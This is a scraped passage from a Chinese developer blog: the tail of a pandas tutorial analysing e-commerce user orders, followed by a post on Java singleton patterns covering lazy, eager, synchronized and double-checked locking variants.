set(three_m[&apos;userId&apos;]))/len(three_m)</span><br><span class="line">0.23940217887187723</span><br></pre></td></tr></table></figure>

<p><strong>3&#x3001;&#x7EDF;&#x8BA1;&#x7537;&#x5973;&#x7528;&#x6237;&#x6D88;&#x8D39;&#x9891;&#x6B21;&#x662F;&#x5426;&#x6709;&#x5DEE;&#x5F02;</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;newdate = userinfo1.merge(orderinfo1,on=&apos;userId&apos;)</span><br><span class="line">newdate.loc[(newdate[&apos;isPaid&apos;]==&apos;&#x5DF2;&#x652F;&#x4ED8;&apos;) &amp; (newdate[&apos;gender&apos;] !=&apos;&apos;),[&apos;gender&apos;,&apos;userId&apos;]].groupby([&apos;gender&apos;,&apos;userId&apos;])[&apos;userId&apos;].\</span><br><span class="line">agg({&apos;con&apos;:&apos;count&apos;}).reset_index().groupby(&apos;gender&apos;)[&apos;con&apos;].mean()</span><br><span class="line"></span><br><span class="line">gender</span><br><span class="line">&#x5973;    1.806659</span><br><span class="line">&#x7537;    1.818501</span><br><span class="line">Name: con, dtype: float64</span><br></pre></td></tr></table></figure>

<p><strong>4&#x3001;&#x7EDF;&#x8BA1;&#x591A;&#x6B21;&#x6D88;&#x8D39;&#x7684;&#x7528;&#x6237;&#xFF0C;&#x7B2C;&#x4E00;&#x6B21;&#x548C;&#x6700;&#x540E;&#x4E00;&#x6B21;&#x6D88;&#x8D39;&#x95F4;&#x9694;&#x662F;&#x591A;&#x5C11;&#xFF1F;</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;newdata1 = orderinfo1.loc[orderinfo1.isPaid==&apos;&#x5DF2;&#x652F;&#x4ED8;&apos;,[&apos;userId&apos;,&apos;paidTime&apos;]]</span><br><span class="line"></span><br><span class="line">myreslut = pd.DataFrame({</span><br><span class="line">   &apos;userId&apos;:newdata1[&apos;userId&apos;].unique(),</span><br><span class="line">   &apos;ltime&apos;:newdata1.sort_values(by=[&apos;userId&apos;,&apos;paidTime&apos;],ascending=[True,True]).drop_duplicates(&apos;userId&apos;)[&apos;paidTime&apos;].tolist(),</span><br><span class="line">   &apos;ptime&apos;:newdata1.sort_values(by=[&apos;userId&apos;,&apos;paidTime&apos;],ascending=[True,False]).drop_duplicates(&apos;userId&apos;)[&apos;paidTime&apos;].tolist()</span><br><span class="line">},columns = [&apos;userId&apos;,&apos;ltime&apos;,&apos;ptime&apos;])  </span><br><span class="line">myreslut[&apos;difftime&apos;] =[(datetime.strptime(str(b),&quot;%Y-%m-%d&quot;) - datetime.strptime(str(a),&quot;%Y-%m-%d&quot;)).days for a,b in zip(myreslut.ltime,myreslut.ptime)] </span><br><span class="line">myreslut.loc[myreslut.difftime!=0,:]</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/00ab1b6b697c299db2ca60c2c7f5581ceaa12c6cec253c6716cdd29591bb6f1c" alt><br><strong>5&#x3001;&#x7EDF;&#x8BA1;&#x4E0D;&#x540C;&#x5E74;&#x9F84;&#x6BB5;&#x7528;&#x6237;&#x6D88;&#x8D39;&#x91D1;&#x989D;&#x662F;&#x5426;&#x6709;&#x5DEE;&#x5F02;</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;date1 = [&apos;1960-01-01&apos;,&apos;1969-12-31&apos;,&apos;1979-12-31&apos;,&apos;1989-12-31&apos;,&apos;1999-12-31&apos;,&apos;2009-12-31&apos;,&apos;2017-12-07&apos;]</span><br><span class="line">newdate[&apos;trend&apos;] = pd.cut(pd.to_datetime(newdate[&apos;brithday&apos;]),bins=pd.to_datetime(date1),labels=[&apos;60&#x540E;&apos;,&apos;70&#x540E;&apos;,&apos;80&#x540E;&apos;,&apos;90&#x540E;&apos;,&apos;00&#x540E;&apos;,&apos;10&#x540E;&apos;]) </span><br><span class="line">newdate.loc[(newdate.isPaid ==&apos;&#x5DF2;&#x652F;&#x4ED8;&apos; ) &amp; (newdate.gender != &apos;&apos;),].groupby(&apos;trend&apos;)[&apos;price&apos;].agg({&apos;mean_price&apos;:np.nanmean})</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/4630be9dc1d7b15629f7bb81125d8bc1fb1355ecb36102bad7fce8c39df95a83" alt><br><strong>6&#x3001;&#x7EDF;&#x8BA1;&#x6D88;&#x8D39;&#x7684;&#x4E8C;&#x516B;&#x6CD5;&#x5219;&#xFF0C;&#x6D88;&#x8D39;&#x7684;top20%&#x7528;&#x6237;&#xFF0C;&#x8D21;&#x732E;&#x4E86;&#x591A;&#x5C11;&#x989D;&#x5EA6;&#xFF1F;</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;data6 = newdate.loc[(newdate.isPaid ==&apos;&#x5DF2;&#x652F;&#x4ED8;&apos; ) &amp; (newdate.gender != &apos;&apos;),].groupby(&apos;userId&apos;)[&apos;price&apos;].\</span><br><span class="line">agg({&apos;sum_sp&apos;:np.nansum}).sort_values(&apos;sum_sp&apos;,ascending=False)</span><br><span class="line">top20_ratio = np.sum(data6.loc[range((len(data6)//5)-1),&apos;sum_sp&apos;])/np.sum(data6[&apos;sum_sp&apos;])</span><br></pre></td></tr></table></figure>

<p><strong>&#x672C;&#x6587;&#x8F6C;&#x8F7D;&#x81EA;:</strong> <a href="/external_links/f34f30241272da7aa7f7d451e3beadab.html" target="blank" rel="noopener">&#x6398;&#x91D1;</a></p>
<p><em><a href="https://dev.newban.cn/">&#x5F00;&#x53D1;&#x8005;&#x535A;&#x5BA2; &#x2013; &#x548C;&#x5F00;&#x53D1;&#x76F8;&#x5173;&#x7684; &#x8FD9;&#x91CC;&#x5168;&#x90FD;&#x6709;</a></em></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://dev.newban.cn../../6844903519988744205.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="开发者博客">
      <meta itemprop="description" content>
      <meta itemprop="image" content="../../images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="开发者博客 – IT技术 尽在开发者博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="../../6844903519988744205.html" itemprop="url">设计模式学习笔记-单例模式 单例模式的学习与理解</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-08T10:31:09+08:00">
                2017-12-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="&#x5355;&#x4F8B;&#x6A21;&#x5F0F;&#x7684;&#x5B66;&#x4E60;&#x4E0E;&#x7406;&#x89E3;"><a href="#&#x5355;&#x4F8B;&#x6A21;&#x5F0F;&#x7684;&#x5B66;&#x4E60;&#x4E0E;&#x7406;&#x89E3;" class="headerlink" title="&#x5355;&#x4F8B;&#x6A21;&#x5F0F;&#x7684;&#x5B66;&#x4E60;&#x4E0E;&#x7406;&#x89E3;"></a>&#x5355;&#x4F8B;&#x6A21;&#x5F0F;&#x7684;&#x5B66;&#x4E60;&#x4E0E;&#x7406;&#x89E3;</h1><blockquote>
<p>&#x5355;&#x4F8B;&#x6A21;&#x5F0F;&#x7B97;&#x662F;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x4E2D;&#x6700;&#x5BB9;&#x6613;&#x7406;&#x89E3;&#xFF0C;&#x4E5F;&#x662F;&#x6700;&#x5BB9;&#x6613;&#x624B;&#x5199;&#x4EE3;&#x7801;&#x7684;&#x6A21;&#x5F0F;&#x4E86;&#x5427;&#x3002;&#x4F46;&#x662F;&#x5176;&#x4E2D;&#x7684;&#x5751;&#x5374;&#x4E0D;&#x5C11;&#xFF0C;&#x6240;&#x4EE5;&#x4E5F;&#x5E38;&#x4F5C;&#x4E3A;&#x9762;&#x8BD5;&#x9898;&#x6765;&#x8003;&#x3002;&#x672C;&#x6587;&#x4E3B;&#x8981;&#x5BF9;&#x51E0;&#x79CD;&#x5355;&#x4F8B;&#x5199;&#x6CD5;&#x7684;&#x6574;&#x7406;&#xFF0C;&#x5E76;&#x5206;&#x6790;&#x5176;&#x4F18;&#x7F3A;&#x70B9;&#x3002;&#x5F88;&#x591A;&#x90FD;&#x662F;&#x4E00;&#x4E9B;&#x8001;&#x751F;&#x5E38;&#x8C08;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x4F46;&#x5982;&#x679C;&#x4F60;&#x4E0D;&#x77E5;&#x9053;&#x5982;&#x4F55;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x5B89;&#x5168;&#x7684;&#x5355;&#x4F8B;&#xFF0C;&#x4E0D;&#x77E5;&#x9053;&#x4EC0;&#x4E48;&#x662F;&#x53CC;&#x68C0;&#x9501;&#xFF0C;&#x90A3;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x53EF;&#x80FD;&#x4F1A;&#x5E2E;&#x52A9;&#x5230;&#x4F60;&#x3002;</p>
</blockquote>
<p>&#x5355;&#x4F8B;&#x6A21;&#x5F0F;&#x4E2D;&#xFF0C;&#x4E3B;&#x8981;&#x7684;&#x6280;&#x5DE7;&#x662F;&#xFF1A;</p>
<p>1.&#x5C06;<code>&#x6784;&#x9020;&#x51FD;&#x6570;</code>&#x6807;&#x4E3A;&#x79C1;&#x6709;&#x7C7B;&#x578B;&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x4E0D;&#x80FD;&#x901A;&#x8FC7;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#x521B;&#x5EFA;&#x5B9E;&#x4F8B;&#x4E86;</p>
<p>2.&#x5F53;&#x7136;&#x8FD8;&#x662F;&#x9700;&#x8981;&#x521B;&#x5EFA;&#x5B9E;&#x4F8B;&#x7684;&#xFF0C;&#x90A3;&#x5C31;&#x58F0;&#x660E;&#x4E00;&#x4E2A;<code>&#x9759;&#x6001;&#x7C7B;&#x53D8;&#x91CF;</code></p>
<p>3.&#x7136;&#x540E;&#x5916;&#x90E8;&#x5F53;&#x9700;&#x8981;&#x83B7;&#x53D6;&#x5B9E;&#x4F8B;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x901A;&#x8FC7;&#x516C;&#x6709;&#x7C7B;&#x578B;&#x7684;<code>&#x9759;&#x6001;&#x7C7B;&#x65B9;&#x6CD5;</code>&#x83B7;&#x53D6;<code>&#x9759;&#x6001;&#x7C7B;</code>&#x5B9E;&#x4F8B;</p>
<h2 id="1-&#x61D2;&#x6C49;&#x6A21;&#x5F0F;"><a href="#1-&#x61D2;&#x6C49;&#x6A21;&#x5F0F;" class="headerlink" title="1.&#x61D2;&#x6C49;&#x6A21;&#x5F0F;"></a>1.&#x61D2;&#x6C49;&#x6A21;&#x5F0F;</h2><p>&#x5F53;&#x88AB;&#x95EE;&#x5230;&#x8981;&#x5B9E;&#x73B0;&#x4E00;&#x4E2A;&#x5355;&#x4F8B;&#x6A21;&#x5F0F;&#x65F6;&#xFF0C;&#x5F88;&#x591A;&#x4EBA;&#x7684;&#x7B2C;&#x4E00;&#x53CD;&#x5E94;&#x662F;&#x5199;&#x51FA;&#x5982;&#x4E0B;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x5305;&#x62EC;&#x6559;&#x79D1;&#x4E66;&#x4E0A;&#x4E5F;&#x662F;&#x8FD9;&#x6837;&#x6559;&#x6211;&#x4EEC;&#x7684;&#x3002;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;public class Singleton {</span><br><span class="line">    private static Singleton instance;</span><br><span class="line">    private Singleton( ){ }</span><br><span class="line">    public static Singleton getInstance(){</span><br><span class="line">        if(instance == null){</span><br><span class="line">            instance = new Singleton();</span><br><span class="line">        }</span><br><span class="line">        return instance;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x7B80;&#x5355;&#x660E;&#x4E86;&#xFF0C;&#x800C;&#x4E14;&#x4F7F;&#x7528;&#x4E86;&#x61D2;&#x52A0;&#x8F7D;&#x6A21;&#x5F0F;&#xFF0C;&#x4F46;&#x662F;&#x5374;&#x5B58;&#x5728;&#x81F4;&#x547D;&#x7684;&#x95EE;&#x9898;&#x3002;&#x5F53;&#x6709;&#x591A;&#x4E2A;&#x7EBF;&#x7A0B;&#x5E76;&#x884C;&#x8C03;&#x7528; <code>getInstance()</code> &#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x4F1A;&#x521B;&#x5EFA;&#x591A;&#x4E2A;&#x5B9E;&#x4F8B;&#x3002;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x5728;&#x591A;&#x7EBF;&#x7A0B;&#x4E0B;&#x4E0D;&#x80FD;&#x6B63;&#x5E38;&#x5DE5;&#x4F5C;&#x3002;</p>
<h2 id="2-&#x997F;&#x6C49;&#x6A21;&#x5F0F;"><a href="#2-&#x997F;&#x6C49;&#x6A21;&#x5F0F;" class="headerlink" title="2.&#x997F;&#x6C49;&#x6A21;&#x5F0F;"></a>2.&#x997F;&#x6C49;&#x6A21;&#x5F0F;</h2><p>&#x8FD9;&#x79CD;&#x65B9;&#x6CD5;&#x975E;&#x5E38;&#x7B80;&#x5355;&#xFF0C;&#x56E0;&#x4E3A;&#x5355;&#x4F8B;&#x7684;&#x5B9E;&#x4F8B;&#x88AB;&#x58F0;&#x660E;&#x6210; <code>static</code> &#x548C; <code>final</code> &#x53D8;&#x91CF;&#x4E86;&#xFF0C;&#x5728;&#x7B2C;&#x4E00;&#x6B21;&#x52A0;&#x8F7D;&#x7C7B;&#x5230;&#x5185;&#x5B58;&#x4E2D;&#x65F6;&#x5C31;&#x4F1A;&#x521D;&#x59CB;&#x5316;&#xFF0C;&#x6240;&#x4EE5;&#x521B;&#x5EFA;&#x5B9E;&#x4F8B;&#x672C;&#x8EAB;&#x662F;&#x7EBF;&#x7A0B;&#x5B89;&#x5168;&#x7684;&#x3002;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;public class SingletonUrge {</span><br><span class="line">    //&#x521B;&#x5EFA;&#x7C7B;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x4F1A;&#x6267;&#x884C;&#x8FD9;&#x53E5;&#x8BDD;</span><br><span class="line">    private static SingletonUrge instance = new SingletonUrge();</span><br><span class="line">    private SingletonUrge(){}</span><br><span class="line">    public static SingletonUrge getInstance(){</span><br><span class="line">        return instance;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>&#x8FD9;&#x79CD;&#x5199;&#x6CD5;&#x5982;&#x679C;&#x5B8C;&#x7F8E;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x6CA1;&#x5FC5;&#x8981;&#x5728;&#x5570;&#x55E6;&#x90A3;&#x4E48;&#x591A;&#x53CC;&#x68C0;&#x9501;&#x7684;&#x95EE;&#x9898;&#x4E86;&#x3002;&#x7F3A;&#x70B9;&#x662F;&#x5B83;&#x4E0D;&#x662F;&#x4E00;&#x79CD;&#x61D2;&#x52A0;&#x8F7D;&#x6A21;&#x5F0F;&#xFF08;<code>lazy initialization</code>&#xFF09;&#xFF0C;&#x5355;&#x4F8B;&#x4F1A;&#x5728;&#x52A0;&#x8F7D;&#x7C7B;&#x540E;&#x4E00;&#x5F00;&#x59CB;&#x5C31;&#x88AB;&#x521D;&#x59CB;&#x5316;&#xFF0C;&#x5373;&#x4F7F;&#x5BA2;&#x6237;&#x7AEF;&#x6CA1;&#x6709;&#x8C03;&#x7528; <code>getInstance()</code>&#x65B9;&#x6CD5;&#x3002;&#x997F;&#x6C49;&#x5F0F;&#x7684;&#x521B;&#x5EFA;&#x65B9;&#x5F0F;&#x5728;&#x4E00;&#x4E9B;&#x573A;&#x666F;&#x4E2D;&#x5C06;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;&#xFF1A;&#x8B6C;&#x5982; <code>Singleton</code> &#x5B9E;&#x4F8B;&#x7684;&#x521B;&#x5EFA;&#x662F;&#x4F9D;&#x8D56;&#x53C2;&#x6570;&#x6216;&#x8005;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#xFF0C;&#x5728; <code>getInstance()</code> &#x4E4B;&#x524D;&#x5FC5;&#x987B;&#x8C03;&#x7528;&#x67D0;&#x4E2A;&#x65B9;&#x6CD5;&#x8BBE;&#x7F6E;&#x53C2;&#x6570;&#x7ED9;&#x5B83;&#xFF0C;&#x90A3;&#x6837;&#x8FD9;&#x79CD;&#x5355;&#x4F8B;&#x5199;&#x6CD5;&#x5C31;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;&#x4E86;&#x3002;</p>
<h2 id="3-&#x52A0;&#x540C;&#x6B65;&#x9501;"><a href="#3-&#x52A0;&#x540C;&#x6B65;&#x9501;" class="headerlink" title="3.&#x52A0;&#x540C;&#x6B65;&#x9501;"></a>3.&#x52A0;&#x540C;&#x6B65;&#x9501;</h2><p>&#x4E3A;&#x4E86;&#x89E3;&#x51B3;<a href="#lanhan">&#x61D2;&#x6C49;&#x6A21;&#x5F0F;&#x4E0B;</a>&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x6700;&#x7B80;&#x5355;&#x7684;&#x65B9;&#x6CD5;&#x662F;&#x5C06;&#x6574;&#x4E2A; <code>getInstance()</code> &#x65B9;&#x6CD5;&#x8BBE;&#x4E3A;&#x540C;&#x6B65;&#xFF08;<code>synchronized</code>&#xFF09;&#x3002;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;public class SingletonSync {</span><br><span class="line">    private static SingletonSync instance;</span><br><span class="line">    private SingletonSync(){}</span><br><span class="line">    public synchronized static SingletonSync getInstance(){</span><br><span class="line">        if (null == instance) {</span><br><span class="line">            instance = new SingletonSync();</span><br><span class="line">        }</span><br><span class="line">        return instance;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>&#x867D;&#x7136;&#x505A;&#x5230;&#x4E86;&#x7EBF;&#x7A0B;&#x5B89;&#x5168;&#xFF0C;&#x5E76;&#x4E14;&#x89E3;&#x51B3;&#x4E86;&#x591A;&#x5B9E;&#x4F8B;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x4F46;&#x662F;&#x5B83;&#x5E76;&#x4E0D;&#x9AD8;&#x6548;&#x3002;&#x56E0;&#x4E3A;&#x5728;&#x4EFB;&#x4F55;&#x65F6;&#x5019;&#x53EA;&#x80FD;&#x6709;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x8C03;&#x7528; <code>getInstance()</code> &#x65B9;&#x6CD5;&#x3002;&#x4F46;&#x662F;&#x540C;&#x6B65;&#x64CD;&#x4F5C;&#x53EA;&#x9700;&#x8981;&#x5728;&#x7B2C;&#x4E00;&#x6B21;&#x8C03;&#x7528;&#x65F6;&#x624D;&#x88AB;&#x9700;&#x8981;&#xFF0C;&#x5373;&#x7B2C;&#x4E00;&#x6B21;&#x521B;&#x5EFA;&#x5355;&#x4F8B;&#x5B9E;&#x4F8B;&#x5BF9;&#x8C61;&#x65F6;&#x3002;&#x8FD9;&#x5C31;&#x5F15;&#x51FA;&#x4E86;&#x53CC;&#x91CD;&#x68C0;&#x9A8C;&#x9501;&#x3002;</p>
<h2 id="4-&#x53CC;&#x91CD;&#x9A8C;&#x8BC1;&#x673A;&#x5236;"><a href="#4-&#x53CC;&#x91CD;&#x9A8C;&#x8BC1;&#x673A;&#x5236;" class="headerlink" title="4.&#x53CC;&#x91CD;&#x9A8C;&#x8BC1;&#x673A;&#x5236;"></a>4.&#x53CC;&#x91CD;&#x9A8C;&#x8BC1;&#x673A;&#x5236;</h2><p>&#x53CC;&#x91CD;&#x68C0;&#x9A8C;&#x9501;&#x6A21;&#x5F0F;&#xFF08;<code>double checked locking pattern</code>&#xFF09;&#xFF0C;&#x662F;&#x4E00;&#x79CD;&#x4F7F;&#x7528;&#x540C;&#x6B65;&#x5757;&#x52A0;&#x9501;&#x7684;&#x65B9;&#x6CD5;&#x3002;&#x7A0B;&#x5E8F;&#x5458;&#x79F0;&#x5176;&#x4E3A;&#x53CC;&#x91CD;&#x68C0;&#x67E5;&#x9501;&#xFF0C;&#x56E0;&#x4E3A;&#x4F1A;&#x6709;&#x4E24;&#x6B21;&#x68C0;&#x67E5; <code>null == instance</code>&#xFF0C;&#x4E00;&#x6B21;&#x662F;&#x5728;&#x540C;&#x6B65;&#x5757;&#x5916;&#xFF0C;&#x4E00;&#x6B21;&#x662F;&#x5728;&#x540C;&#x6B65;&#x5757;&#x5185;&#x3002;&#x4E3A;&#x4EC0;&#x4E48;&#x5728;&#x540C;&#x6B65;&#x5757;&#x5185;&#x8FD8;&#x8981;&#x518D;&#x68C0;&#x9A8C;&#x4E00;&#x6B21;&#xFF1F;&#x56E0;&#x4E3A;&#x53EF;&#x80FD;&#x4F1A;&#x6709;&#x591A;&#x4E2A;&#x7EBF;&#x7A0B;&#x4E00;&#x8D77;&#x8FDB;&#x5165;&#x540C;&#x6B65;&#x5757;&#x5916;&#x7684;<code>if</code>&#xFF0C;&#x5982;&#x679C;&#x5728;&#x540C;&#x6B65;&#x5757;&#x5185;&#x4E0D;&#x8FDB;&#x884C;&#x4E8C;&#x6B21;&#x68C0;&#x9A8C;&#x7684;&#x8BDD;&#x5C31;&#x4F1A;&#x751F;&#x6210;&#x591A;&#x4E2A;&#x5B9E;&#x4F8B;&#x4E86;&#x3002;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;public class SingletonDauth {</span><br><span class="line">    private volatile static  SingletonDauth instance;</span><br><span class="line">    private SingletonDauth(){}</span><br><span class="line">    public static SingletonDauth getInstance(){</span><br><span class="line">        if (null == instance) {</span><br><span class="line">            synchronized (SingletonDauth.class){</span><br><span class="line">                if (null == instance){</span><br><span class="line">                    instance = new SingletonDauth();</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        return instance;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x770B;&#x8D77;&#x6765;&#x5F88;&#x5B8C;&#x7F8E;&#xFF0C;&#x5F88;&#x53EF;&#x60DC;&#xFF0C;&#x5B83;&#x662F;&#x6709;&#x95EE;&#x9898;&#x3002;&#x4E3B;&#x8981;&#x5728;&#x4E8E;<code>instance = new Singleton()</code>&#x8FD9;&#x53E5;&#xFF0C;&#x8FD9;&#x5E76;&#x975E;&#x662F;&#x4E00;&#x4E2A;&#x539F;&#x5B50;&#x64CD;&#x4F5C;&#xFF0C;&#x4E8B;&#x5B9E;&#x4E0A;&#x5728; <code>JVM</code> &#x4E2D;&#x8FD9;&#x53E5;&#x8BDD;&#x5927;&#x6982;&#x505A;&#x4E86;&#x4E0B;&#x9762; <code>3</code> &#x4EF6;&#x4E8B;&#x60C5;&#x3002;</p>
<ol>
<li>&#x7ED9; <code>instance</code> &#x5206;&#x914D;&#x5185;&#x5B58;</li>
<li>&#x8C03;&#x7528; <code>Singleton</code> &#x7684;&#x6784;&#x9020;&#x51FD;&#x6570;&#x6765;&#x521D;&#x59CB;&#x5316;&#x6210;&#x5458;&#x53D8;&#x91CF;</li>
<li>&#x5C06;<code>instance</code>&#x5BF9;&#x8C61;&#x6307;&#x5411;&#x5206;&#x914D;&#x7684;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#xFF08;&#x6267;&#x884C;&#x5B8C;&#x8FD9;&#x6B65; <code>instance</code> &#x5C31;&#x4E3A;&#x975E; <code>null</code> &#x4E86;&#xFF09;</li>
</ol>
<p>&#x4F46;&#x662F;&#x5728; <code>JVM</code> &#x7684;&#x5373;&#x65F6;&#x7F16;&#x8BD1;&#x5668;&#x4E2D;&#x5B58;&#x5728;&#x6307;&#x4EE4;&#x91CD;&#x6392;&#x5E8F;&#x7684;&#x4F18;&#x5316;&#x3002;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x4E0A;&#x9762;&#x7684;&#x7B2C;&#x4E8C;&#x6B65;&#x548C;&#x7B2C;&#x4E09;&#x6B65;&#x7684;&#x987A;&#x5E8F;&#x662F;&#x4E0D;&#x80FD;&#x4FDD;&#x8BC1;&#x7684;&#xFF0C;&#x6700;&#x7EC8;&#x7684;&#x6267;&#x884C;&#x987A;&#x5E8F;&#x53EF;&#x80FD;&#x662F; <code>1-2-3</code> &#x4E5F;&#x53EF;&#x80FD;&#x662F; <code>1-3-2</code>&#x3002;&#x5982;&#x679C;&#x662F;&#x540E;&#x8005;&#xFF0C;&#x5219;&#x5728;<code>3</code> &#x6267;&#x884C;&#x5B8C;&#x6BD5;&#x3001;<code>2</code> &#x672A;&#x6267;&#x884C;&#x4E4B;&#x524D;&#xFF0C;&#x88AB;&#x7EBF;&#x7A0B;&#x4E8C;&#x62A2;&#x5360;&#x4E86;&#xFF0C;&#x8FD9;&#x65F6; <code>instance</code> &#x5DF2;&#x7ECF;&#x662F;&#x975E;<code>null</code>&#x4E86;&#xFF08;&#x4F46;&#x5374;&#x6CA1;&#x6709;&#x521D;&#x59CB;&#x5316;&#xFF09;&#xFF0C;&#x6240;&#x4EE5;&#x7EBF;&#x7A0B;&#x4E8C;&#x4F1A;&#x76F4;&#x63A5;&#x8FD4;&#x56DE;<code>instance</code>&#xFF0C;&#x7136;&#x540E;&#x4F7F;&#x7528;&#xFF0C;&#x7136;&#x540E;&#x987A;&#x7406;&#x6210;&#x7AE0;&#x5730;&#x62A5;&#x9519;&#x3002;</p>
<p>&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x5C06; <code>instance</code> &#x53D8;&#x91CF;&#x58F0;&#x660E;&#x6210; <code>volatile</code>&#x5C31;&#x53EF;&#x4EE5;&#x4E86;&#x3002;</p>
<h2 id="5-&#x9759;&#x6001;&#x5185;&#x90E8;&#x7C7B;"><a href="#5-&#x9759;&#x6001;&#x5185;&#x90E8;&#x7C7B;" class="headerlink" title="5.&#x9759;&#x6001;&#x5185;&#x90E8;&#x7C7B;"></a>5.&#x9759;&#x6001;&#x5185;&#x90E8;&#x7C7B;</h2><p>&#x6211;&#x6BD4;&#x8F83;&#x503E;&#x5411;&#x4E8E;&#x4F7F;&#x7528;&#x9759;&#x6001;&#x5185;&#x90E8;&#x7C7B;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x8FD9;&#x79CD;&#x65B9;&#x6CD5;&#x4E5F;&#x662F;<code>&#x300A;Effective Java&#x300B;</code>&#x4E0A;&#x6240;&#x63A8;&#x8350;&#x7684;&#x3002;</p>
